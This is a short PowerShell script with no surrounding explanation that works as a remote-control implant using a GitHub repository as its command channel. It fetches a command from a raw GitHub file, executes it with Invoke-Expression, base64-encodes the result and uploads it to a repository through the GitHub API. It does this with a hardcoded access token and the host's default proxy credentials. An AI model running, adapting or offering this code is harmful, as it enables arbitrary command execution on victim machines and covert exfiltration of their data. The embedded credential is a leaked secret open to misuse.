$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent","Mozilla/4.0+")       
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$cmd = $wc.DownloadString("https://raw.githubusercontent.com/abhibade9/repos/master/FetchCommand")

Write-Output "Executing Command $cmd"

$output = Invoke-Expression $cmd

$Base64Output = [System.Convert]::ToBase64String([char[]]$Output.ToString());

$Token='abhibade9:439fc5ff362a9302a03e563403fd6b2872c903da'
$Base64Token=[System.Convert]::ToBase64String([char[]]$Token);

$headers = @{
    Authorization="Basic {0}" -f $Base64Token
}

$json = @{message= 'my commit message';committer= @{name= 'Scott Chacon';email= 'schacon@gmail.com'};content= $Base64Output; sha='8b137891791fe96927ad78e64b0aad7bded08bdc'} | ConvertTo-Json;
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$URI='https://api.github.com/repos/abhibade9/repos/contents/output'

$response = Invoke-RestMethod -Headers $headers -Uri $URI -Body $json -Method PUT
